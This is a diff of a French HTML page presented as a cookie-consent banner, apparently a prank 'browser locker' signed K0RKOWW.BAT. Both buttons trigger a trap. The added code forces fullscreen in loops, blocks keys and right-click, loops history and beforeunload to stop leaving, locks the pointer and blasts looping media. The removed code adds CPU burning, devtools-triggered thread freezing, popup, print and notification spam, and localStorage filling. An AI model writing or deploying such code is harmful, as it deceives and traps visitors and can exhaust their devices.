@@ -1,511 +1,266 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🍪 Cookies requis</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            cursor: none !important;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>🍪 Cookies</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{
+  width:100%;height:100%;overflow:hidden;background:#000;
+  font-family:Segoe UI,Arial,sans-serif;color:#fff;user-select:none;
+}
+body{display:flex;align-items:center;justify-content:center}
 
-        body {
-            background: #0d0d0d;
-            font-family: 'Segoe UI', 'Arial', sans-serif;
-            height: 100vh;
-            width: 100vw;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #fff;
-            position: relative;
-            user-select: none;
-        }
+.badge{
+  position:fixed;top:14px;left:50%;transform:translateX(-50%);
+  z-index:3000;color:#00ff88;font:14px/1 "Courier New",monospace;
+  letter-spacing:3px;padding:8px 18px;border-radius:20px;
+  border:1px solid #00ff8844;background:#000c;text-shadow:0 0 12px #00ff8866;
+  white-space:nowrap
+}
 
-        #overlay {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(8px);
-            z-index: 999;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            transition: opacity 0.8s ease;
-        }
+#overlay{
+  position:fixed;inset:0;z-index:1000;display:flex;align-items:center;justify-content:center;
+  background:rgba(0,0,0,.9);backdrop-filter:blur(10px);transition:opacity .5s
+}
+#overlay.hide{opacity:0;pointer-events:none}
 
-        #overlay.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
+.card{
+  width:min(460px,92vw);background:linear-gradient(145deg,#1a1a2e,#16213e);
+  border:1px solid #00ff8844;border-radius:24px;padding:44px 36px 36px;text-align:center;
+  box-shadow:0 20px 60px #000a,0 0 40px #00ff8822
+}
+.icon{font-size:64px;margin-bottom:12px}
+.card h1{font-size:26px;margin-bottom:12px}
+.card p{color:#aaa;font-size:15px;line-height:1.6;margin-bottom:28px}
+.card strong{color:#00ff88}
+.btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.btn{
+  min-width:140px;padding:14px 36px;border-radius:50px;border:none;
+  font-size:16px;font-weight:700;cursor:pointer
+}
+.ok{background:linear-gradient(135deg,#00ff88,#00cc6a);color:#0d0d0d}
+.no{background:transparent;color:#ff4444;border:2px solid #ff4444}
 
-        .badge {
-            position: fixed;
-            top: 12px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #00ff88;
-            font-size: 14px;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 3px;
-            text-shadow: 0 0 10px #00ff8866;
-            z-index: 1001;
-            background: #0d0d0dcc;
-            padding: 6px 18px;
-            border-radius: 20px;
-            border: 1px solid #00ff8844;
-            white-space: nowrap;
-        }
+/* VIDÉO PLEIN ÉCRAN */
+#v{
+  position:fixed;inset:0;width:100vw;height:100vh;object-fit:cover;
+  background:#000;z-index:2000;display:none
+}
+#v.on{display:block}
 
-        .cookie-card {
-            background: linear-gradient(145deg, #1a1a2e, #16213e);
-            border: 1px solid #00ff8844;
-            border-radius: 24px;
-            padding: 50px 40px 40px;
-            max-width: 460px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 40px #00ff8822;
-        }
-
-        .cookie-card h1 { font-size: 26px; font-weight: 700; margin-bottom: 10px; color: #fff; }
-        .cookie-card p { color: #aaa; font-size: 15px; line-height: 1.6; margin-bottom: 28px; }
-        .cookie-card p strong { color: #00ff88; }
-        .cookie-icon { font-size: 64px; margin-bottom: 16px; }
-
-        .btn-group { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; }
-        .btn {
-            padding: 14px 40px; border: none; border-radius: 50px;
-            font-size: 16px; font-weight: 600; cursor: pointer;
-            transition: all 0.2s ease; min-width: 140px; letter-spacing: 0.5px;
-        }
-        .btn-accept {
-            background: linear-gradient(135deg, #00ff88, #00cc6a);
-            color: #0d0d0d; box-shadow: 0 4px 20px #00ff8844;
-        }
-        .btn-refuse {
-            background: transparent; color: #ff4444; border: 2px solid #ff4444;
-        }
-
-        #trap-video {
-            position: fixed; top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            object-fit: cover; z-index: 1500; display: none; background: #000;
-        }
-        #trap-video.active { display: block; }
-
-        /* Canvas de glitch overlay */
-        #glitch-canvas {
-            position: fixed; top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            z-index: 1800; display: none;
-            pointer-events: none; mix-blend-mode: overlay;
-        }
-        #glitch-canvas.active { display: block; }
-
-        #trap-message {
-            position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 2000; display: none;
-            flex-direction: column; justify-content: center; align-items: center;
-            text-align: center; padding: 20px; pointer-events: none;
-        }
-        #trap-message.active { display: flex; }
-        #trap-message h2 {
-            font-size: 52px; margin-bottom: 10px; font-weight: 900;
-            text-shadow: 0 0 30px #000, 0 0 60px #000; color: #00ff88;
-        }
-        #trap-message .sub {
-            color: #ccc; font-size: 16px; font-family: 'Courier New', monospace;
-            margin-top: 10px; animation: blink 0.5s infinite; text-shadow: 0 0 20px #000;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-        #trap-message .funny {
-            margin-top: 30px; color: #aaa; font-size: 14px; font-style: italic; text-shadow: 0 0 20px #000;
-        }
-    </style>
+#mark{
+  position:fixed;inset:0;z-index:2500;display:none;flex-direction:column;
+  align-items:center;justify-content:center;text-align:center;pointer-events:none;
+  text-shadow:0 0 20px #000,0 0 40px #000
+}
+#mark.on{display:flex}
+#mark h2{font-size:clamp(28px,7vw,56px);color:#00ff88;font-weight:900;margin-bottom:10px}
+#mark .sub{color:#ff4444;font-family:"Courier New",monospace;font-size:16px;animation:blink .4s infinite}
+@keyframes blink{50%{opacity:0}}
+</style>
 </head>
 <body>
 
-    <div class="badge">⬡ SEARCHED BY K0RKOWW.BAT ⬡</div>
+<div class="badge">⬡ SEARCHED BY K0RKOWW.BAT ⬡</div>
 
-    <div id="overlay">
-        <div class="cookie-card">
-            <div class="cookie-icon">🍪</div>
-            <h1>Ce site utilise des cookies</h1>
-            <p>
-                Nous utilisons des cookies pour améliorer votre expérience, 
-                analyser le trafic et vous offrir des publicités 
-                <strong>hautement personnalisées</strong>.<br><br>
-                En cliquant sur <strong>"Accepter"</strong> ou <strong>"Refuser"</strong>, 
-                vous consentez à l'utilisation de <strong>tous les cookies</strong> 
-                (oui, même Refuser. On s'en fiche).
-            </p>
-            <div class="btn-group">
-                <button class="btn btn-accept" id="btn-accept">✓ Accepter</button>
-                <button class="btn btn-refuse" id="btn-refuse">✗ Refuser</button>
-            </div>
-        </div>
+<div id="overlay">
+  <div class="card">
+    <div class="icon">🍪</div>
+    <h1>Ce site utilise des cookies</h1>
+    <p>
+      Nous utilisons des cookies pour améliorer votre expérience et des pubs
+      <strong>hautement personnalisées</strong>.<br><br>
+      <strong>Accepter</strong> ou <strong>Refuser</strong> = même résultat.
+    </p>
+    <div class="btns">
+      <button class="btn ok" id="a">✓ Accepter</button>
+      <button class="btn no" id="r">✗ Refuser</button>
     </div>
+  </div>
+</div>
 
-    <video id="trap-video" preload="auto" loop playsinline muted>
-        <source src="vidéo.mp4" type="video/mp4">
-    </video>
+<!-- vidéo / musique du fichier local -->
+<video id="v" preload="auto" loop playsinline webkit-playsinline>
+  <source src="video.mp3" type="video/mp4">
+  <source src="video.mp3" type="audio/mpeg">
+  <source src="video.mp4" type="video/mp4">
+</video>
 
-    <canvas id="glitch-canvas"></canvas>
+<!-- musique de secours si le navigateur bloque le son de la vidéo -->
+<audio id="aFx" preload="auto" loop>
+  <source src="video.mp3" type="audio/mpeg">
+  <source src="video.mp4" type="audio/mp4">
+</audio>
 
-    <div id="trap-message">
-        <h2>🕹️ PIÉGÉ PAR K0RKOWW</h2>
-        <p style="color:#fff; font-size:20px; max-width:500px; margin-top:10px; text-shadow:0 0 20px #000;">
-            T'as cliqué. Maintenant tu subis.<br>
-            <span style="font-size:14px; color:#ff4444;">╳ FERMETURE IMPOSSIBLE ╳</span>
-        </p>
-        <div class="sub">⏺ SYS. CRITICAL LOCK • DO NOT EXIT</div>
-        <div class="funny">Essaye Alt+F4. Je t'attends.</div>
-    </div>
+<div id="mark">
+  <h2>🕹️ PIÉGÉ PAR K0RKOWW</h2>
+  <p style="color:#fff;font-size:20px;margin:8px 0 14px">La musique joue. T'es en plein écran.</p>
+  <div class="sub">⏺ LOCKED • NE QUITTE PAS • NE FERME PAS</div>
+</div>
 
-    <script>
-    (function() {
-        'use strict';
+<script>
+(function () {
+  const overlay = document.getElementById('overlay');
+  const v = document.getElementById('v');
+  const aFx = document.getElementById('aFx');
+  const mark = document.getElementById('mark');
 
-        const overlay   = document.getElementById('overlay');
-        const video     = document.getElementById('trap-video');
-        const trapMsg   = document.getElementById('trap-message');
-        const canvas    = document.getElementById('glitch-canvas');
-        const ctx       = canvas.getContext('2d');
+  // ---- bloque clavier / clic droit ----
+  function stop(e){ e.preventDefault(); e.stopPropagation(); return false; }
+  ['keydown','keyup','keypress','contextmenu','selectstart','dragstart','copy','cut','paste','wheel']
+    .forEach(ev => document.addEventListener(ev, stop, true));
 
-        // === Canvas glitch sizing ===
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        resizeCanvas();
-        window.addEventListener('resize', resizeCanvas);
+  // ---- anti fermeture onglet ----
+  window.addEventListener('beforeunload', e => {
+    e.preventDefault();
+    e.returnValue = 'LOCKED';
+    return 'LOCKED';
+  });
 
-        // === BLOCCAGE CLAVIER MAX ===
-        document.addEventListener('keydown', e => {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
+  // ---- anti retour navigateur ----
+  history.pushState(null, '', location.href);
+  window.addEventListener('popstate', () => {
+    history.pushState(null, '', location.href);
+  });
+  setInterval(() => {
+    try { history.pushState(null, '', location.href); } catch(_) {}
+  }, 80);
 
-        document.addEventListener('keyup', e => {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-        }, true);
+  // ---- plein écran forcé ----
+  function goFS() {
+    const el = document.documentElement;
+    const req = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen || el.mozRequestFullScreen;
+    if (req) {
+      try { req.call(el); } catch(_) {}
+    }
+    // aussi essayer sur la vidéo
+    const vr = v.requestFullscreen || v.webkitRequestFullscreen || v.webkitEnterFullscreen;
+    if (vr) {
+      try { vr.call(v); } catch(_) {}
+    }
+  }
 
-        // === BLOCCAGE SOURIS ===
-        document.addEventListener('contextmenu', e => e.preventDefault(), true);
-        document.addEventListener('selectstart', e => e.preventDefault(), true);
-        document.addEventListener('dragstart', e => e.preventDefault(), true);
-        document.addEventListener('copy', e => e.preventDefault(), true);
-        document.addEventListener('cut', e => e.preventDefault(), true);
-        document.addEventListener('paste', e => e.preventDefault(), true);
+  function keepFS() {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
+      goFS();
+    }
+  }
 
-        // === BLOCCAGE beforeunload MULTIPLE ===
-        function blockUnload(e) {
-            e.preventDefault();
-            e.returnValue = 'SYSTEM LOCKED';
-            return 'SYSTEM LOCKED';
-        }
-        window.addEventListener('beforeunload', blockUnload);
-        window.addEventListener('unload', blockUnload);
-        window.addEventListener('pagehide', blockUnload);
+  document.addEventListener('fullscreenchange', keepFS);
+  document.addEventListener('webkitfullscreenchange', keepFS);
 
-        // === HISTOIRE INFINIE ===
-        (function blockHistory() {
-            history.pushState(null, null, location.href);
-            window.addEventListener('popstate', function(e) {
-                while(true) {
-                    history.pushState(null, null, location.href);
-                    history.forward();
-                }
-            });
-        })();
+  // ---- lecture vidéo + musique à fond ----
+  function playMedia() {
+    v.muted = false;
+    v.volume = 1.0;
+    aFx.muted = false;
+    aFx.volume = 1.0;
 
-        // setInterval anti-history
-        setInterval(() => {
-            for(let i=0; i<50; i++) {
-                history.pushState(null, null, location.href);
-            }
-        }, 50);
+    const p1 = v.play();
+    if (p1 && p1.catch) p1.catch(() => {
+      // autoplay parfois bloqué : on mute une micro-seconde puis unmute
+      v.muted = true;
+      v.play().then(() => {
+        v.muted = false;
+        v.volume = 1.0;
+      }).catch(() => {});
+    });
 
-        // === PLEIN ÉCRAN VIOLENT ===
-        function goFullscreen() {
-            const el = document.documentElement;
-            const methods = [
-                () => el.requestFullscreen(),
-                () => el.webkitRequestFullscreen(),
-                () => el.msRequestFullscreen(),
-                () => el.mozRequestFullScreen()
-            ];
-            methods.forEach(fn => { try { fn(); } catch(e) {} });
-        }
+    const p2 = aFx.play();
+    if (p2 && p2.catch) p2.catch(() => {
+      aFx.muted = true;
+      aFx.play().then(() => {
+        aFx.muted = false;
+        aFx.volume = 1.0;
+      }).catch(() => {});
+    });
+  }
 
-        // Forcer plein écran en boucle
-        setInterval(goFullscreen, 200);
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement) goFullscreen();
-        });
-        document.addEventListener('webkitfullscreenchange', () => {
-            if (!document.webkitFullscreenElement) goFullscreen();
-        });
+  function forcePlayForever() {
+    if (v.paused) playMedia();
+    if (aFx.paused) aFx.play().catch(() => {});
+    v.muted = false;
+    v.volume = 1.0;
+    aFx.muted = false;
+    aFx.volume = 1.0;
+    keepFS();
+    try { window.focus(); } catch(_) {}
+  }
 
-        // === POINTER LOCK API - piège la souris ===
-        function lockPointer() {
-            try {
-                document.body.requestPointerLock();
-            } catch(e) {}
-        }
+  v.addEventListener('pause', () => playMedia());
+  v.addEventListener('ended', () => playMedia());
+  aFx.addEventListener('pause', () => aFx.play().catch(()=>{}));
+  aFx.addEventListener('ended', () => aFx.play().catch(()=>{}));
 
-        document.addEventListener('pointerlockchange', () => {
-            if (document.pointerLockElement !== document.body) {
-                setTimeout(lockPointer, 10);
-            }
-        });
+  // ---- pointer lock (souris piégée) ----
+  function lockMouse() {
+    try {
+      const r = document.body.requestPointerLock || document.body.mozRequestPointerLock;
+      if (r) r.call(document.body);
+    } catch(_) {}
+  }
+  document.addEventListener('pointerlockchange', () => {
+    if (document.pointerLockElement !== document.body) setTimeout(lockMouse, 30);
+  });
 
-        document.addEventListener('mousemove', (e) => {
-            if (document.pointerLockElement !== document.body) {
-                lockPointer();
-            }
-        });
+  // ---- bloquer le scroll tél ----
+  document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
 
-        // === DÉTECTION DEVTOOLS - si ouvert, on crash ===
-        function detectDevTools() {
-            const threshold = 160;
-            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
-            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
-            if (widthThreshold || heightThreshold) {
-                // Boucle infinie pour crasher le thread
-                const start = Date.now();
-                while(Date.now() - start < 5000) {
-                    for(let i=0; i<1000000; i++) {
-                        Math.random() * Math.random();
-                    }
-                }
-            }
-        }
-        setInterval(detectDevTools, 500);
+  // ---- piège principal ----
+  function trap() {
+    overlay.classList.add('hide');
+    v.classList.add('on');
+    mark.classList.add('on');
 
-        // === FENÊTRES POPUP INFINIES ===
-        function spawnWindows() {
-            try {
-                const win = window.open('about:blank', '_blank', 'width=100,height=100');
-                if (win) {
-                    win.document.write('<html><body style="background:#000;color:#0f0;font-size:50px;">🔒 LOCKED</body></html>');
-                }
-            } catch(e) {}
-        }
-        setInterval(spawnWindows, 2000);
+    // 1) plein écran immédiat
+    goFS();
+    setTimeout(goFS, 100);
+    setTimeout(goFS, 400);
 
-        // === PRINT DIALOG SPAM ===
-        setInterval(() => {
-            try { window.print(); } catch(e) {}
-        }, 3000);
+    // 2) son + vidéo
+    playMedia();
 
-        // === GLITCH CANVAS OVERLAY - effet visuel psychédélique ===
-        function drawGlitch() {
-            ctx.fillStyle = 'rgba(0,0,0,0.1)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
+    // 3) lock souris
+    setTimeout(lockMouse, 150);
 
-            for (let i = 0; i < 20; i++) {
-                const x = Math.random() * canvas.width;
-                const y = Math.random() * canvas.height;
-                const w = Math.random() * 200 + 10;
-                const h = Math.random() * 4 + 1;
-                ctx.fillStyle = `rgba(0, 255, 136, ${Math.random() * 0.3})`;
-                ctx.fillRect(x, y, w, h);
-            }
+    // 4) boucle de surveillance (très serrée)
+    setInterval(forcePlayForever, 250);
 
-            // Lignes de bruit aléatoires
-            for (let i = 0; i < 5; i++) {
-                const y = Math.random() * canvas.height;
-                ctx.strokeStyle = `rgba(255, 0, 0, ${Math.random() * 0.2})`;
-                ctx.lineWidth = Math.random() * 3 + 1;
-                ctx.beginPath();
-                ctx.moveTo(0, y);
-                ctx.lineTo(canvas.width, y + (Math.random() - 0.5) * 50);
-                ctx.stroke();
-            }
-        }
+    // 5) si l'utilisateur quitte le plein écran, on le rattrape
+    setInterval(goFS, 400);
 
-        // === AUDIO CONTEXT NOISE - bruit parasite en plus ===
-        let audioCtx = null;
-        let noiseNode = null;
+    // 6) wake lock (anti veille mobile)
+    try {
+      if (navigator.wakeLock) {
+        navigator.wakeLock.request('screen').then(wl => {
+          wl.addEventListener('release', () => {
+            navigator.wakeLock.request('screen').catch(()=>{});
+          });
+        }).catch(()=>{});
+      }
+    } catch(_) {}
 
-        function startNoise() {
-            try {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const bufferSize = audioCtx.sampleRate * 0.1;
-                const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
-                const data = buffer.getChannelData(0);
-                for (let i = 0; i < bufferSize; i++) {
-                    data[i] = (Math.random() * 2 - 1) * 0.03;
-                }
-                noiseNode = audioCtx.createBufferSource();
-                noiseNode.buffer = buffer;
-                noiseNode.loop = true;
-                const gain = audioCtx.createGain();
-                gain.gain.value = 0.05;
-                noiseNode.connect(gain);
-                gain.connect(audioCtx.destination);
-                noiseNode.start();
-            } catch(e) {}
-        }
+    // 7) si onglet caché → reverrouille au retour
+    document.addEventListener('visibilitychange', () => {
+      forcePlayForever();
+      goFS();
+    });
 
-        // === CPU BURN - fait chauffer le CPU ===
-        let burning = false;
-        function burnCPU() {
-            if (!burning) return;
-            const start = Date.now();
-            while(Date.now() - start < 100) {
-                for(let i=0; i<100000; i++) {
-                    document.createElement('div');
-                    Math.sqrt(Math.random() * 999999);
-                }
-            }
-            requestAnimationFrame(burnCPU);
-        }
+    // 8) tout clic relance tout
+    document.addEventListener('click', () => {
+      forcePlayForever();
+      goFS();
+      lockMouse();
+    }, true);
 
-        // === VIBRATION MOBILE ===
-        function vibrateHell() {
-            try {
-                if (navigator.vibrate) {
-                    navigator.vibrate([100, 50, 100, 50, 200, 100, 200]);
-                    setTimeout(() => navigator.vibrate([500, 100, 500]), 1000);
-                }
-            } catch(e) {}
-        }
+    console.log('%cK0RKOWW.BAT LOCK', 'color:#00ff88;font-size:28px;font-weight:900');
+  }
 
-        // === BOUCLE DE VERROUILLAGE DE FOCUS ===
-        setInterval(() => {
-            try { window.focus(); } catch(e) {}
-        }, 100);
-
-        // === TRIGGER PRINCIPAL ===
-        function triggerTrap() {
-            // Cache l'overlay cookie
-            overlay.classList.add('hidden');
-
-            // Affiche vidéo + active le son
-            video.classList.add('active');
-            video.muted = false;
-            video.volume = 1.0;
-
-            // Joue la vidéo (tentatives multiples)
-            const playVideo = () => {
-                video.play().catch(() => {
-                    setTimeout(playVideo, 100);
-                });
-            };
-            playVideo();
-
-            // Rejoue si pause
-            video.addEventListener('pause', () => video.play().catch(() => {}));
-            video.addEventListener('ended', () => video.play().catch(() => {}));
-
-            // Affiche message et glitch
-            setTimeout(() => {
-                trapMsg.classList.add('active');
-                canvas.classList.add('active');
-            }, 300);
-
-            // Lance le glitch visuel
-            setInterval(drawGlitch, 50);
-
-            // Plein écran + pointer lock
-            setTimeout(() => {
-                goFullscreen();
-                lockPointer();
-            }, 200);
-
-            // Bruit parasite
-            setTimeout(startNoise, 1000);
-
-            // Vibration mobile
-            setInterval(vibrateHell, 3000);
-
-            // Spawn popups
-            setTimeout(() => {
-                setInterval(spawnWindows, 1500);
-            }, 2000);
-
-            // CPU burn après 5 secondes
-            setTimeout(() => {
-                burning = true;
-                burnCPU();
-            }, 5000);
-
-            // Wake Lock anti-sommeil
-            try {
-                if ('wakeLock' in navigator) {
-                    (async () => {
-                        try {
-                            const wl = await navigator.wakeLock.request('screen');
-                            wl.addEventListener('release', () => {
-                                navigator.wakeLock.request('screen').catch(() => {});
-                            });
-                        } catch(e) {}
-                    })();
-                }
-            } catch(e) {}
-
-            // Notification spam si permis
-            if ('Notification' in window && Notification.permission === 'granted') {
-                setInterval(() => {
-                    try {
-                        new Notification('🔒 SYSTÈME VERROUILLÉ', {
-                            body: 'Tu peux pas fermer.',
-                            requireInteraction: true
-                        });
-                    } catch(e) {}
-                }, 2000);
-            }
-
-            // Demander la permission notif
-            try { Notification.requestPermission(); } catch(e) {}
-
-            // Boucle de survol: rejoue vidéo + plein écran + pointer lock
-            setInterval(() => {
-                video.play().catch(() => {});
-                goFullscreen();
-                lockPointer();
-                window.focus();
-                // Remplit le localStorage
-                try {
-                    for(let i=0; i<100; i++) {
-                        localStorage.setItem('_lock_'+i, 'x'.repeat(10000));
-                    }
-                } catch(e) {}
-            }, 500);
-
-            console.log('%c🔥 K0RKOWW.BAT - SYSTEM LOCK ACTIVE', 'font-size:40px; color:#00ff88; font-weight:900;');
-            console.log('%cTask Manager est ta seule issue.', 'font-size:18px; color:#ff4444;');
-        }
-
-        document.getElementById('btn-accept').addEventListener('click', (e) => {
-            e.stopPropagation();
-            triggerTrap();
-        });
-
-        document.getElementById('btn-refuse').addEventListener('click', (e) => {
-            e.stopPropagation();
-            triggerTrap();
-        });
-
-        // Anti-fermeture clavier même avant le clic
-        console.log('%c🍪 En attente de ton clic...', 'font-size:20px; color:#00ff88;');
-    })();
-    </script>
+  document.getElementById('a').onclick = e => { e.stopPropagation(); trap(); };
+  document.getElementById('r').onclick = e => { e.stopPropagation(); trap(); };
+})();
+</script>
 </body>
 </html>
